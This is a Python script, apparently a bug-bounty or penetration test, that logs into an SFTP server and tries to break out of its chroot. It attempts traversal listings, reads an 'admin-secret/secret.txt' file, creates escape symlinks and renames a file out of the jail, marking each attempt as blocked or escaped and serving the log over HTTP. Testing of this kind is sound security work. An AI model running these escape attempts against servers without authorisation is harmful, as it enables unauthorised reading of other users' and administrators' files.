import os, io, time, traceback
from http.server import BaseHTTPRequestHandler, HTTPServer
import paramiko

HOST=os.environ.get("SFTP_HOST","")
PORT=int(os.environ.get("SFTP_PORT","22"))
USER=os.environ.get("SFTP_USER","")
PASS=os.environ.get("SFTP_PASS","")

OUT=io.StringIO()
def log(*a):
    print(*a, flush=True)
    print(*a, file=OUT)

def throttle(): time.sleep(0.6)

def run_tests():
    log("=== SFTP path-escape / chroot test ===")
    log("host=%s port=%s user=%s" % (HOST, PORT, USER))
    try:
        t=paramiko.Transport((HOST,PORT)); t.banner_timeout=30
        t.connect(username=USER,password=PASS)
        log("CONNECTED OK")
    except Exception as e:
        log("CONNECT FAILED:", type(e).__name__, e); return
    try:
        s=paramiko.SFTPClient.from_transport(t)
        try: log("normalize('.') =", s.normalize('.'))
        except Exception as e: log("normalize err", e)
        throttle()
        try: log("getcwd =", s.getcwd())
        except Exception as e: log("getcwd err", e)
        # listing home
        throttle()
        try: log("listdir('.') =", s.listdir('.'))
        except Exception as e: log("listdir('.') err", e)
        # escape attempts
        for p in ['..','../..','/','/admin-secret','/user2-folder/../admin-secret','admin-secret','../admin-secret']:
            throttle()
            try:
                r=s.listdir(p); log("ESCAPE listdir(%r) -> FAIL(escaped): %r" % (p, r[:20]))
            except Exception as e:
                log("listdir(%r) -> PASS(blocked): %s %s" % (p, type(e).__name__, e))
        for p in ['/admin-secret/secret.txt','../admin-secret/secret.txt','admin-secret/secret.txt','/user2-folder/../admin-secret/secret.txt']:
            throttle()
            try:
                with s.open(p,'r') as f: data=f.read(200)
                log("DOWNLOAD get(%r) -> FAIL(escaped): %r" % (p, data))
            except Exception as e:
                log("get(%r) -> PASS(blocked): %s %s" % (p, type(e).__name__, e))
        # normalize weird
        for p in ['/admin-secret','../','/..']:
            throttle()
            try: log("normalize(%r) = %s" % (p, s.normalize(p)))
            except Exception as e: log("normalize(%r) err %s" % (p, e))
        # symlink attempt inside home pointing outside
        throttle()
        try:
            s.symlink('../admin-secret','esc_link')
            log("symlink created esc_link -> ../admin-secret")
            throttle()
            try:
                r=s.listdir('esc_link'); log("SYMLINK listdir(esc_link) -> FAIL(escaped): %r" % (r[:20],))
            except Exception as e:
                log("listdir(esc_link) -> PASS(blocked): %s %s" % (type(e).__name__, e))
            throttle()
            try: s.remove('esc_link')
            except Exception as e: log("cleanup esc_link err", e)
        except Exception as e:
            log("symlink('../admin-secret') -> PASS(blocked at create): %s %s" % (type(e).__name__, e))
        # symlink to root
        throttle()
        try:
            s.symlink('/','root_link')
            log("symlink root_link -> / created")
            throttle()
            try:
                r=s.listdir('root_link'); log("SYMLINK listdir(root_link=/) -> result: %r" % (r[:20],))
            except Exception as e:
                log("listdir(root_link) -> %s %s" % (type(e).__name__, e))
            try: s.remove('root_link')
            except: pass
        except Exception as e:
            log("symlink('/') -> blocked: %s %s" % (type(e).__name__, e))
        # rename/move out of chroot
        throttle()
        try:
            # create a temp file first
            with s.open('bb_tmp.txt','w') as f: f.write('x')
            throttle()
            try:
                s.rename('bb_tmp.txt','../admin-secret/bb_escaped.txt')
                log("RENAME to ../admin-secret -> FAIL(escaped)")
            except Exception as e:
                log("rename out-of-chroot -> PASS(blocked): %s %s" % (type(e).__name__, e))
            throttle()
            try: s.remove('bb_tmp.txt')
            except: pass
        except Exception as e:
            log("rename test setup err", e)
        t.close()
    except Exception as e:
        log("TEST ERROR:", traceback.format_exc())

RESULT=""
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type','text/plain'); self.end_headers()
        self.wfile.write(RESULT.encode())
    def log_message(self,*a): pass

if __name__=="__main__":
    try: run_tests()
    except Exception as e: log("FATAL", e)
    RESULT=OUT.getvalue()
    p=int(os.environ.get("PORT","10000"))
    HTTPServer(("0.0.0.0",p),H).serve_forever()
